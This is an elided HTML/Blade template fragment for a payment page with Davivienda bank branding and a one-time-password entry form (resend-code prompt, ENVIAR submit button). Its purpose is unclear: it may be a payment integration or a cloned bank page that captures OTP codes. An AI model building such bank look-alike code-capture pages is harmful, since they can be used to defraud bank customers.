...
<head>
    ...
    <link rel="stylesheet" href="{{asset('assets/css/payment/davivienda.css')}}">
...
<body>
    <div id="formContainer" class="details" style="padding:6px;">
        <img src="{{asset('assets/img/payment/davivienda/davi.png')}}" alt="" srcset="" width="100px">
    <hr>
    ...
    <br><a style="color:black;">Para recibir un nuevo código por favor haga click en REENVIAR CODIGO</a><br><br><br>
        ...
        <input type="submit" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:80%;"></center>
        <p></p>
        <p>
            <br>
        </p>
